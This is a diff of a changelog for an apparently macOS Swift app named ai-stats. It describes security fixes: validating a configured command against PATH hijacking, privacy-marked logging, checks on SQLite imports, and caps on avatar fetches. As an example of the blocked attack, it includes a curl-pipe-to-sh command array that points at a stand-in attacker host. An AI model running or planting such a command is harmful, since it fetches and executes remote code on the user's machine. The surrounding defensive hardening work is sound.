@@ -5,6 +5,12 @@
 
 ## [Unreleased]
 
+### Security pass #3 — PATH-hijack, os.Logger privacy, валидация DB-import
+
+- **`ccusage_command[0]` валидируется** перед запуском Process: разрешены только `npx`, `bunx` или абсолютный путь (с запретом `..` внутри). Закрывает arbitrary command execution через подмену `~/.config/ai-stats/config.json` (например `["curl", "evil.example.com/script", "|", "sh"]`). Из `extraSearchPaths` убран home-relative `~/.bun/bin` — home-writable, PATH-hijack-vector. Bun-юзеры добавляют bun в shell PATH (env прокидывается child'у через `enrichedEnvironment`).
+- **Все `NSLog` заменены на `os.Logger`** с privacy-маркерами (`Shared/Util/AppLogger.swift`). Категории: `sync`, `github`, `aiuse`, `ccusage`, `db`, `pricing`, `widget`. Response bodies, paths с home, repo nameWithOwner, friend_code, error.localizedDescription — все помечены `.private` (в Console.app/sysdiagnose видны как `<private>` без debugger'а). Идентификаторы вроде `period`, `source` — `.public` для удобства фильтрации.
+- **DB-import теперь валидируется**: проверка SQLite magic header (16 байт), `PRAGMA integrity_check`, наличие requiredTables (`ai_usage`, `github_activity`, `sync_state`). Невалидный файл — alert до confirm-диалога, оригинальная БД не трогается. Добавлен rollback: если copyItem импортируемого файла падает после удаления оригинала — восстанавливаем из backup.
+
 ### Security pass #2 — MIME/size cap на аватарки, JSON-cap, пин ccusage
 
 - **`getAvatar` теперь имеет жёсткий cap 512 KB и MIME-allowlist `{image/png, image/jpeg}`**. Закрывает RCE-вектор через ImageIO: malformed PNG/JPEG/SVG от скомпрометированного aiuse-сервера больше не доедет до `NSImage(data:)`. Чтение идёт через `URLSession.bytes(for:)` со streaming-cap'ом + Content-Length precheck. SVG специально отбит — формат позволяет JS/external refs, для нас не нужен.
